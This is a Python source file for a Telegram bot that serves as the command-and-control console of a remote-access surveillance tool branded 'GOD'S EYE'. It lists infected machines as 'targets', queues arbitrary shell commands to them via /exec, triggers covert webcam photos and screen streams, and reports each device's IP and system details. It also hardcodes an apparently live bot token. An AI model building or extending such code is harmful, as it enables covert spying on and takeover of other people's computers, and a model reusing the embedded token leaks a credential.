import telepot
import time
import threading
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from models import db, Device, Command
from app import app
import os

# Replace with your actual bot token
# BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'
BOT_TOKEN='7963672699:AAH8Xrv5yotfHomAyd6GoV1hQ83XMq_jCQ4'

def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    
    if content_type == 'text':
        # command = msg['text'].split()
        # cmd = command[0]
        text = msg['text']

        if text == '/start':
            welcome_msg = (
                "ACCESS GRANTED. IDENTITY VERIFIED: COMMANDER XCYBEREX.\n\n"
                "**PROTCOL: GOD'S EYE**\n"
                "CLASSIFICATION: TOP SECRET // MILITARY-GRADE SURVEILLANCE\n\n"
                "Welcome to the central command interface. This system is authorized for:\n"
                "- Law Enforcement Monitoring\n"
                "- Corporate Asset Tracking\n"
                "- Real-time Device Control\n\n"
                "Select a directive below to proceed."
            )
            keyboard = ReplyKeyboardMarkup(keyboard=[
                [KeyboardButton(text='List Devices'), KeyboardButton(text='System Status')],
                [KeyboardButton(text='Help / Protocols')]
            ], resize_keyboard=True)
            bot.sendMessage(chat_id, welcome_msg, parse_mode='Markdown', reply_markup=keyboard)
        
        elif text == 'List Devices' or text == '/list':
            with app.app_context():
                devices = Device.query.all()
                if not devices:
                    bot.sendMessage(chat_id, "Scanning network...\nNO ACTIVE TARGETS FOUND.")
                else:
                    bot.sendMessage(chat_id, f"Scanning network...\n{len(devices)} TARGET(S) IDENTIFIED.")
                    for d in devices:
                        status = "ONLINE" if d.is_online else "OFFLINE"
                        emoji = "🟢" if d.is_online else "🔴"
                        # Use telepot.namedtuple for InlineKeyboardMarkup
                        keyboard = InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text='ℹ️ Info', callback_data=f'info_{d.id}'),
                             InlineKeyboardButton(text='📺 Stream', callback_data=f'stream_{d.id}')],
                            [InlineKeyboardButton(text='📸 Photo', callback_data=f'photo_{d.id}'),
                             InlineKeyboardButton(text='💀 Exec', callback_data=f'exec_{d.id}')]
                        ])
                        bot.sendMessage(chat_id, f"{emoji} **TARGET: {d.name}**\nSTATUS: {status}\nID: `{d.hardware_id}`", parse_mode='Markdown', reply_markup=keyboard)

        elif text == 'System Status':
            bot.sendMessage(chat_id, "**SYSTEM STATUS: OPERATIONAL**\nSever: ONLINE\nDatabase: CONNECTED\nEncryption: ACTIVE", parse_mode='Markdown')

        elif text == 'Help / Protocols':
            help_text = (
                "**OPERATIONAL PROTOCOLS**\n\n"
                "1. **List Devices**: Display all connected targets.\n"
                "2. **Info**: Retrieve system metrics (CPU, RAM, Loc).\n"
                "3. **Stream**: Access live visual feed.\n"
                "4. **Exec**: Deploy remote shell commands.\n\n"
                "usage: `/exec <id> <command>`"
            )
            bot.sendMessage(chat_id, help_text, parse_mode='Markdown')

        elif text.startswith('/exec'):
            command = text.split()
            if len(command) < 3:
                bot.sendMessage(chat_id, "USAGE ERROR: /exec <PROTOCOL_ID> <COMMAND>")
                return
            device_id = command[1]
            cmd_text = " ".join(command[2:])
            with app.app_context():
                device = Device.query.get(device_id)
                if device:
                    new_cmd = Command(device_id=device.id, command_text=cmd_text)
                    db.session.add(new_cmd)
                    db.session.commit()
                    bot.sendMessage(chat_id, f"COMMAND AUTHORIZED: '{cmd_text}' deployed to target {device.name}.")
                else:
                    bot.sendMessage(chat_id, "TARGET NOT FOUND.")

        elif text.startswith('/info'):
            command = text.split()
            if len(command) < 2:
                bot.sendMessage(chat_id, "USAGE ERROR: /info <PROTOCOL_ID>")
                return
            device_id = command[1]
            with app.app_context():
                device = Device.query.get(device_id)
                if device:
                    response = (
                        f"**TARGET REPORT: {device.name}**\n"
                        f"ID: `{device.hardware_id}`\n"
                        f"IP: {device.ip_address}\n"
                        f"OS: {device.os_info}\n"
                        f"CPU LOAD: {device.cpu_usage}%\n"
                        f"RAM USAGE: {device.ram_usage} / {device.total_ram} GB\n"
                        f"LAST CONTACT: {device.last_seen}"
                    )
                    bot.sendMessage(chat_id, response, parse_mode='Markdown')
                else:
                    bot.sendMessage(chat_id, "TARGET NOT FOUND.")


def on_callback_query(msg):
    query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
    action, device_id = query_data.split('_')
    
    with app.app_context():
        device = Device.query.get(device_id)
        if not device:
            bot.answerCallbackQuery(query_id, text='Device not found')
            return

        if action == 'info':
            response = f"ID: {device.id}\nName: {device.name}\nIP: {device.ip_address}\nOS: {device.os_info}\nCPU: {device.cpu_usage}%\nRAM: {device.ram_usage}GB\nLast Seen: {device.last_seen}"
            bot.sendMessage(from_id, response)
        
        elif action == 'stream':
             # For Telegram, we can't easily stream video. We'll send a link to the dashboard stream.
             # Assuming the dashboard is accessible (e.g. if this is local, localhost)
             # If hosted, use public IP.
             stream_url = f"http://localhost:5000/device/{device.id}" # Simplified
             bot.sendMessage(from_id, f"View Stream Here: {stream_url}\n(Functionality limited in Bot, check Dashboard for real-time MJPEG)")
             
             # Also trigger the start stream command on client just in case it's not running
             new_cmd = Command(device_id=device.id, command_text="START_STREAM_SCREEN")
             db.session.add(new_cmd)
             db.session.commit()

        elif action == 'photo':
            new_cmd = Command(device_id=device.id, command_text="CAPTURE_CAM")
            db.session.add(new_cmd)
            db.session.commit()
            bot.sendMessage(from_id, "Photo request sent. Wait a few seconds then check /list -> Info or Dashboard.")
            # Ideally we'd have a way to push the photo back to the user when it arrives, 
            # but that requires a more complex state polling or push mechanism.
            
        elif action == 'exec':
            bot.sendMessage(from_id, f"To execute, type:\n/exec {device.id} <command>")

    bot.answerCallbackQuery(query_id, text='Action processed')

bot = telepot.Bot(BOT_TOKEN)

def start_bot():
    bot.message_loop({'chat': handle, 'callback_query': on_callback_query})
    print("Telegram Bot Listening...")
    while True:
        time.sleep(10)

if __name__ == '__main__':
    start_bot()
